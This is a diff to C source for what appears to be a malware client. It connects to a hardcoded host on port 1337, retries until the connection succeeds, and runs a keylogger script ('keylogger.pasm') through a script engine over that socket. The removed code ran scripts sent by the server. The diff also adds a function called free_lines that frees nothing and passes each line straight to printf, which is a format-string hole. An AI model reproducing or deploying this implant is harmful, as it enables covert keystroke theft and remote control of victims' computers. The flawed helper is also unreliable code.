@@ -9,76 +9,82 @@
 
 #define BUFFER_SIZE 4096
 
-char** get_lines(char* str, int* count) {
-    // Check for null pointer
-    if (!str || !count) {
-        return 0;
+
+#define INITIAL_BUFFER_SIZE 256
+#define INITIAL_ARRAY_SIZE 10
+
+char** read_file_into_array(const char* filename, int* lines_count) {
+    FILE* file = fopen(filename, "r");
+    if (file == NULL) {
+        perror("Error opening file");
+        return NULL;
     }
 
-    // Count the number of lines
-    *count = 1;
-    for (char* p = str; *p; ++p) {
-        if (*p == '\r' && *(p + 1) == '\n') {
-            ++(*count);
-            ++p; // Skip '\n'
-        }
+    // Allocate initial space for the array of strings
+    int array_size = INITIAL_ARRAY_SIZE;
+    char** lines = malloc(array_size * sizeof(char*));
+    if (lines == NULL) {
+        perror("Error allocating memory for lines");
+        fclose(file);
+        return NULL;
     }
 
-    // Allocate memory for char** array
-    char** lines = (char**)malloc((*count + 1) * sizeof(char*));
-    if (!lines) {
-        // Handle allocation failure
-        return 0;
-    }
+    char buffer[INITIAL_BUFFER_SIZE];
+    int count = 0;
 
-    // Copy lines to char** array
-    int lineIndex = 0;
-    char* start = str;
-    for (char* p = str; *p; ++p) {
-        if (*p == '\r' && *(p + 1) == '\n') {
-            int lineLength = p - start;
-            lines[lineIndex] = (char*)malloc((lineLength + 1) * sizeof(char));
-            if (!lines[lineIndex]) {
-                // Handle allocation failure
+    while (fgets(buffer, INITIAL_BUFFER_SIZE, file)) {
+        // Remove newline character, if present
+        buffer[strcspn(buffer, "\n")] = '\0';
+
+        // Reallocate if necessary
+        if (count >= array_size) {
+            array_size *= 2;
+            char** temp = realloc(lines, array_size * sizeof(char*));
+            if (temp == NULL) {
+                perror("Error reallocating memory for lines");
                 // Free previously allocated memory
-                for (int i = 0; i < lineIndex; ++i) {
+                for (int i = 0; i < count; i++) {
                     free(lines[i]);
                 }
                 free(lines);
-                return 0;
+                fclose(file);
+                return NULL;
             }
-            strncpy(lines[lineIndex], start, lineLength);
-            lines[lineIndex][lineLength] = '\0'; // Null-terminate the line
-            ++lineIndex;
-            ++p; // Skip '\n'
-            start = p + 1; // Move to the next line
+            lines = temp;
         }
+
+        // Allocate memory for the line and store it
+        lines[count] = malloc(strlen(buffer) + 1);
+        if (lines[count] == NULL) {
+            perror("Error allocating memory for a line");
+            // Free previously allocated memory
+            for (int i = 0; i < count; i++) {
+                free(lines[i]);
+            }
+            free(lines);
+            fclose(file);
+            return NULL;
+        }
+
+        strcpy(lines[count], buffer);
+        count++;
     }
 
-    // Copy the last line
-    int lastLineLength = strlen(start);
-    lines[lineIndex] = (char*)malloc((lastLineLength + 1) * sizeof(char));
-    if (!lines[lineIndex]) {
-        // Handle allocation failure
-        // Free previously allocated memory
-        for (int i = 0; i <= lineIndex; ++i) {
-            free(lines[i]);
-        }
-        free(lines);
-        return 0;
-    }
-    strcpy(lines[lineIndex], start);
-    lines[*count] = 0; // Null-terminate the char** array
+    fclose(file);
+
+    // Store the number of lines read
+    *lines_count = count;
 
     return lines;
 }
 
-int WinMain(
-  HINSTANCE hInstance,
-  HINSTANCE hPrevInstance,
-  LPSTR     lpCmdLine,
-  int       nShowCmd
-) {
+void free_lines(char** lines, int count) {
+    for (int i = 0; i < count; i++) {
+        printf(lines[i]);
+    }
+}
+
+int main(int argc, char** argv) {
     int sock;
     int first = 1;
     struct sockaddr_in server;
@@ -100,7 +106,7 @@ retry:
         first = 0;
     }
 
-    server.sin_addr.s_addr = inet_addr("192.168.1.35");
+    server.sin_addr.s_addr = inet_addr("192.168.56.1");
     server.sin_port = htons(1337);
 
     //Create socket
@@ -118,23 +124,9 @@ retry:
         goto retry;
     }
 
-    //keep communicating with server
-    while (1)
-    {
-        memset(server_reply, 0, BUFFER_SIZE);
+    const char* filename = "../../examples/keylogger.pasm";
+    int lines_count;
+    char** lines = read_file_into_array(filename, &lines_count);
 
-        //Receive a reply from the server
-        if (recv(sock, server_reply, BUFFER_SIZE, 0) <= 0)
-        {
-            //recv failed
-            Sleep(500);
-            goto retry;
-        }
-
-		int lines = 0;
-		char **script = get_lines(server_reply, &lines);
-
-        printf("%d\n", pasm_run_script("../examples/keylogger.pasm", 0, 0, sock));
-    }
-    return 0;
+    return pasm_run_script(NULL, lines, lines_count, sock);
 }
